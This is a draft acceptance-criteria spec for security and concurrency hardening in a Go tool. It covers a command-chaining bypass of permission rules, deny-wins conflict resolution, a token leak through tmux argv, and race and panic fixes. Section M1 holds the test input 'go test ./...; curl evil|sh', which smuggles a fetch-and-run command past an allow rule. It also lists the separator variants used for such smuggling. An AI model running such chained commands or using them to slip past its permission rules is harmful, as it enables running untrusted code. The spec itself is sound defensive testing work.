---
id: SPEC-SEC-HARDEN-001
title: "Security & Concurrency Hardening — Acceptance Criteria"
version: "0.1.0"
status: draft
created: 2026-06-13
updated: 2026-06-13
author: GOOS행님
priority: P1
phase: "v3.0.0"
module: "internal/permission, internal/tmux, internal/lsp, internal/resilience, internal/cli/worktree"
lifecycle: spec-anchored
tags: "security, concurrency, acceptance, given-when-then, behavior-preservation"
era: V3R6
tier: L
---

# SPEC-SEC-HARDEN-001 — Acceptance Criteria

Every milestone AC follows the reproduction-first contract: an AC marked **(RED)** asserts the defect is present on the pre-fix code (the test FAILS / demonstrates the bug before the fix); a **(GREEN)** AC asserts the fix corrects it; **(NO-REG)** ACs assert legitimate behavior is unchanged.

One AC (AC-SEC-M5-004) is marked **(OBSERVATIONAL RED)** instead of **(RED)**: its defect (an unrecovered goroutine panic) crashes the `go test` process and cannot be captured by an automated assertion, so it is verified by a one-time manual observation recorded in progress.md, with the post-fix automated verification carried by its GREEN counterpart (AC-SEC-M5-005). See design.md §M5 "RED test soundness".

---

## §M1 — Permission `:*` prefix-match command-chain bypass

### AC-SEC-M1-001 (RED) — bypass demonstrated [REQ-SEC-M1-001, REQ-SEC-M1-002]
- **Given** an allow rule `Bash(go test:*)` and input `go test ./...; curl evil|sh`
- **When** `PermissionRule.Matches("Bash", "go test ./...; curl evil|sh")` is called on the pre-fix code
- **Then** it returns `true` (the bypass exists) — the reproduction test asserts this pre-fix behavior.

### AC-SEC-M1-002 (GREEN) — chained command no longer matches [REQ-SEC-M1-001, REQ-SEC-M1-002]
- **Given** the same rule and input after the fix
- **When** `Matches` is called
- **Then** it returns `false` (the remainder `./...; curl evil|sh` contains an unquoted `;` and `|`).
- **And** each separator variant (`;`, `&&`, `||`, `|`, `$(`, backtick, newline) in the remainder independently causes a non-match (table-driven, one row per separator).

### AC-SEC-M1-003 (NO-REG) — legitimate prefix command still allowed [REQ-SEC-M1-003]
- **Given** rule `Bash(go test:*)` and input `go test ./internal/permission/...`
- **When** `Matches` is called
- **Then** it returns `true` (no unquoted separator in the remainder).

### AC-SEC-M1-004 (NO-REG) — quoted separator not falsely rejected [REQ-SEC-M1-004]
- **Given** rule `Bash(echo:*)` and input `echo "a; b"` (separator inside a quoted segment)
- **When** `Matches` is called
- **Then** it returns `true` (the `;` is inside quotes, not a command boundary).

### AC-SEC-M1-005 (NO-REG) — other pattern branches unchanged [REQ-SEC-M1-001]
- **Given** `/*`-suffix, `*.`-prefix, and exact-match rules
- **When** `Matches` is called with representative inputs
- **Then** results are identical to pre-fix behavior (the fix touches only the `:*` branch).

---

## §M2 — Permission conflict: deny wins on tie + audit log

> **Intended-behavior-change casualty (D2)**: the existing test `internal/permission/conflict_test.go::TestResolveConflict_FsOrderTiebreak` (HEAD `0ef553617`, lines 43-70) asserts an equal-specificity allow+deny tie resolves to the ALLOW rule (`z-settings.json`, fs-order winner). REQ-SEC-M2-001 deliberately inverts this to deny-wins-on-tie, so this test WILL go red — it asserts the very pre-fix defect M2 corrects. It is NOT a regression. Per spec.md §C, this test MUST be **rewritten** during the M2 RED/GREEN cycle to assert deny-wins-on-tie (the deny rule from `a-settings.json` must win). It is the single carve-out from "existing package test suite MUST stay green". The AC-SEC-M2-001 (RED) below is functionally the pre-fix assertion this test currently encodes; AC-SEC-M2-002 (GREEN) is the rewritten assertion.

### AC-SEC-M2-001 (RED) — deny loses on tie pre-fix [REQ-SEC-M2-001]
- **Given** two matched same-tier rules with equal `specificityScore`: one `allow` (Origin lexicographically later) and one `deny` (Origin earlier)
- **When** `resolveConflict` runs on the pre-fix code
- **Then** the `allow` rule wins (Origin-order tiebreak) — the reproduction test asserts the deny does NOT win pre-fix.

### AC-SEC-M2-002 (GREEN) — deny wins on equal-specificity tie [REQ-SEC-M2-001]
- **Given** the same allow+deny equal-specificity pair after the fix
- **When** `resolveConflict` runs
- **Then** the `deny` rule is returned as the winner regardless of Origin ordering.
- **And** the rewritten `TestResolveConflict_FsOrderTiebreak` (the D2 casualty) asserts this deny-wins outcome (no longer asserts the ALLOW fs-order winner).

### AC-SEC-M2-003 (NO-REG) — all-allow tie preserves Origin ordering [REQ-SEC-M2-002]
- **Given** two `allow` rules with equal specificity
- **When** `resolveConflict` runs
- **Then** the lexicographically-later Origin still wins (existing behavior unchanged).

### AC-SEC-M2-004 (NO-REG) — higher specificity still wins regardless of action [REQ-SEC-M2-002]
- **Given** a high-specificity `allow` and a low-specificity `deny`
- **When** `resolveConflict` runs
- **Then** the higher-specificity `allow` wins (deny-precedence applies only on an equal-specificity tie, not across specificity tiers).

### AC-SEC-M2-005 (RED) — conflict log not written pre-fix [REQ-SEC-M2-003]
- **Given** a conflict among ≥2 same-tier rules
- **When** `logConflict` runs on the pre-fix code
- **Then** `.moai/logs/permission.log` is NOT created/appended (the `_ = origins` placeholder) — reproduction test asserts absence.

### AC-SEC-M2-006 (GREEN) — conflict log written [REQ-SEC-M2-003]
- **Given** a conflict among ≥2 same-tier rules after the fix (log dir resolvable)
- **When** the conflict is resolved
- **Then** a conflict record is appended to `.moai/logs/permission.log` containing the candidate origins and their actions.

### AC-SEC-M2-007 (NO-REG) — unwritable log dir does not change decision [REQ-SEC-M2-004]
- **Given** a conflict where the log destination cannot be written
- **When** `resolveConflict` runs
- **Then** the returned winning rule is identical to the writable-log case (best-effort write; decision unaffected; no error surfaced to the caller).

---

## §M3 — tmux credential argv leak (CWE-214)

### AC-SEC-M3-001 (RED) — token leaked via argv pre-fix [REQ-SEC-M3-001]
- **Given** `cfg.GLMEnvVars` containing `ANTHROPIC_AUTH_TOKEN=<secret>` and ActiveMode `glm`/`cg`, with a recording session manager capturing `tmux set-environment` argv
- **When** the worktree tmux integration injects env on the pre-fix code
- **Then** the captured argv for some `set-environment` invocation contains `<secret>` as a positional argument — reproduction test asserts the leak.

### AC-SEC-M3-002 (GREEN) — token never appears in argv [REQ-SEC-M3-001, REQ-SEC-M3-002]
- **Given** the same setup after the fix
- **When** env injection runs
- **Then** no captured `tmux set-environment` argv contains the token value (the token went through `InjectSensitiveEnv`, not argv).

### AC-SEC-M3-003 (GREEN) — token removed from bulk map [REQ-SEC-M3-002]
- **Given** the post-fix path
- **When** the bulk `InjectEnv` is invoked for the remaining vars
- **Then** the map passed to `InjectEnv` does NOT contain `ANTHROPIC_AUTH_TOKEN`.

### AC-SEC-M3-004 (NO-REG) — non-sensitive vars still bulk-injected [REQ-SEC-M3-004]
- **Given** `cfg.GLMEnvVars` with model-slot vars + the token
- **When** the post-fix path runs
- **Then** the non-sensitive vars (`ANTHROPIC_DEFAULT_*_MODEL`, proxy flags, etc.) are still injected via `InjectEnv`.

### AC-SEC-M3-005 (GREEN) — no argv fallback on sensitive-injection failure [REQ-SEC-M3-003]
- **Given** a session manager whose `InjectSensitiveEnv` returns an error
- **When** the post-fix path runs
- **Then** the integration returns the wrapped error AND never calls `InjectEnv` with the token in the map (no argv fallback for the token).

### AC-SEC-M3-006 (NO-REG) — non-GLM/CG mode unchanged [REQ-SEC-M3-004]
- **Given** ActiveMode `cc` (not glm/cg)
- **When** the integration runs
- **Then** no env injection of GLM vars occurs (pre-fix behavior preserved).

---

## §M4 — LSP regression tracker data race

### AC-SEC-M4-001 (RED) — data race demonstrated under -race [REQ-SEC-M4-001, REQ-SEC-M4-002]
- **Given** a `regressionTracker` with `t.baseline == nil` and a readable baseline file on disk
- **When** N (≥8) goroutines call `GetBaseline` concurrently under `go test -race` on the pre-fix code
- **Then** the race detector reports a data race on `t.baseline` (write at line 128 under RLock) — reproduction test FAILS pre-fix.

### AC-SEC-M4-002 (GREEN) — no data race after fix [REQ-SEC-M4-001, REQ-SEC-M4-002]
- **Given** the same concurrent setup after switching `GetBaseline` to a write lock (or double-checked locking)
- **When** the `-race` test runs
- **Then** it passes with no data race reported.

### AC-SEC-M4-003 (NO-REG) — single-reader contract unchanged [REQ-SEC-M4-003]
- **Given** a tracker with a baseline containing a file entry
- **When** `GetBaseline(filePath)` is called sequentially
- **Then** it returns the same `*FileBaseline` value as pre-fix; a missing file-entry returns `ErrBaselineNotFound`; a missing baseline file returns `ErrBaselineNotFound`.

### AC-SEC-M4-004 (NO-REG) — CompareWithBaseline / ClearBaseline unchanged [REQ-SEC-M4-003]
- **Given** the post-fix tracker
- **When** `CompareWithBaseline` and `ClearBaseline` are exercised
- **Then** their observable results match pre-fix behavior.

---

## §M5 — Circuit breaker half-open permit + recovered goroutine

### AC-SEC-M5-001 (RED) — multiple half-open requests pass pre-fix [REQ-SEC-M5-001]
- **Given** a breaker promoted to half-open and a blocking `fn()` (e.g. waits on a barrier)
- **When** N (≥5) goroutines call `Call` concurrently under `go test -race` on the pre-fix code
- **Then** MORE than one `fn()` executes simultaneously (the single-permit invariant is absent) — reproduction test asserts >1 pre-fix.

### AC-SEC-M5-002 (GREEN) — exactly one half-open trial executes [REQ-SEC-M5-001]
- **Given** the same half-open setup after the fix
- **When** N goroutines call `Call` concurrently
- **Then** exactly 1 goroutine executes `fn()` and the other N-1 receive `ErrCircuitOpen`.

### AC-SEC-M5-003 (GREEN) — permit released after trial resolves [REQ-SEC-M5-002]
- **Given** the post-fix breaker after the single half-open trial resolves (success or failure)
- **When** a subsequent `Call` is made
- **Then** it is governed by the new state (closed on success → admits; open on failure → rejects), i.e. the permit was released.

### AC-SEC-M5-004 (OBSERVATIONAL RED) — panicking callback crashes pre-fix [REQ-SEC-M5-003]
- **Note (D3)**: this is an **OBSERVATIONAL RED, not an automated assertion**. A panic in the unrecovered goroutine (`go cb.config.OnStateChange(...)` at circuit.go:196 pre-fix) propagates to the Go runtime and aborts the entire `go test` process — it cannot be caught by the spawning goroutine, so an automated "assert the crash" test would itself abort the suite. Therefore this RED is run ONCE manually against the pre-fix code, the test-binary crash is observed, and the observation is recorded in `progress.md` per the Quality Gate "RED reproduction confirmed to FAIL pre-fix" checklist item. It is NOT committed as an automated test.
- **Given** an `OnStateChange` callback that panics
- **When** a state transition fires the goroutine on the pre-fix code
- **Then** (observed manually) the panic is unrecovered and crashes the test process — confirming the defect. Recorded as a one-time observation in progress.md; the committed/automated verification of this concern is AC-SEC-M5-005.

### AC-SEC-M5-005 (GREEN, AUTOMATED) — panicking callback recovered [REQ-SEC-M5-003]
- **Note (D3)**: this is the **committed, automated AC** for the panic-recovery concern (AC-SEC-M5-004 is the manual observational RED counterpart).
- **Given** the post-fix breaker with a panicking `OnStateChange`
- **When** a state transition fires
- **Then** the panic is recovered inside the goroutine; the test process survives and completes normally; and the breaker's post-transition state is asserted correct.

### AC-SEC-M5-006 (NO-REG) — core transitions + metrics unchanged [REQ-SEC-M5-004]
- **Given** the post-fix breaker
- **When** closed→open (threshold), open→half-open (timeout), half-open→closed (success), half-open→open (failure) sequences run, and `Reset()` is called
- **Then** all transitions, threshold counting, timeout promotion, and metrics (TotalCalls/SuccessCount/FailureCount/RejectedCount) match pre-fix behavior; `Reset()`'s synchronous callback path is unchanged.

---

## §Quality Gate (Definition of Done)

All of the following MUST hold before the SPEC can transition past run-phase:

- [ ] Every RED reproduction test was confirmed to FAIL on the pre-fix commit (RED evidence captured in progress.md). This includes the **OBSERVATIONAL RED** AC-SEC-M5-004 (manual one-time observation of the pre-fix test-process crash, recorded in progress.md — NOT a committed automated test).
- [ ] The M2 intended-behavior-change casualty `TestResolveConflict_FsOrderTiebreak` was rewritten to assert deny-wins-on-tie (D2); no OTHER pre-existing test changed behavior.
- [ ] Every GREEN/NO-REG AC above passes after the fix (AC-SEC-M5-005 is the automated panic-recovery AC).
- [ ] `go test ./internal/permission/... ./internal/tmux/... ./internal/lsp/... ./internal/resilience/... ./internal/cli/worktree/...` green.
- [ ] `go test -race ./internal/lsp/... ./internal/resilience/...` green (M4, M5).
- [ ] `golangci-lint run` clean for the touched packages.
- [ ] `go vet ./...` clean.
- [ ] Coverage for each touched package ≥ pre-change coverage (no regression).
- [ ] No public API signature changed EXCEPT the single §F.5-carved-out additive `tmux.SessionManager.InjectSensitiveEnv(ctx, key, value) error` interface method required by M3/D1 (verify via diff — exactly one interface method added, `*DefaultSessionManager` already implements it, no other signature change).
- [ ] CLI smoke: `go run ./cmd/moai --version` exits 0 (M3 touches a CLI package).
- [ ] No file under §F (exclusions) was modified.
